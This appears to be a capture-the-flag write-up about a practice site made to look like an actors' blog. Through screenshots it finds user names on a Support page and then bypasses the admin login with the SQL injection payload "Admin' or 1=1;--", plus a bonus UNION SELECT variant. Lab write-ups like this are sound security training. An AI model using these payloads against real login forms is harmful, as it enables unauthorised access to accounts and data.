# About
The target is a blog of famous actors (my assumption)
<img width="1920" height="960" alt="Screenshot_2025-11-14_00-21-37" src="https://github.com/user-attachments/assets/8608d40f-626d-48fe-a5f4-174f5856dc29" />

There is not much information right there, all of these are just about actors. Let's find the navigation
<img width="1920" height="958" alt="Screenshot_2025-11-14_00-21-52" src="https://github.com/user-attachments/assets/4926eebe-21c3-416d-bdd2-e30168705f23" />

Then, accessing `Support` page
<img width="1920" height="961" alt="Screenshot_2025-11-14_00-22-00" src="https://github.com/user-attachments/assets/4d0a406e-895a-489a-aab0-a587cd8b64d0" />

Now, I can see some user like `Admin`, `Anna`, and `JimmyMcTrollface`. Let's jump to Admin login
<img width="1920" height="960" alt="Screenshot_2025-11-14_00-22-09" src="https://github.com/user-attachments/assets/0cfb7022-c3a5-46b7-87c8-98a55eb81b5e" />

Since this is a login portal which might be vulnerable to SQL injection. I tested with this payload
```
Admin' or 1=1;--
```
and well it worked.

BONUS 
```
Admin' or 1=1 union select null,null,null;--
```
Happy Hacking!!!~~!!
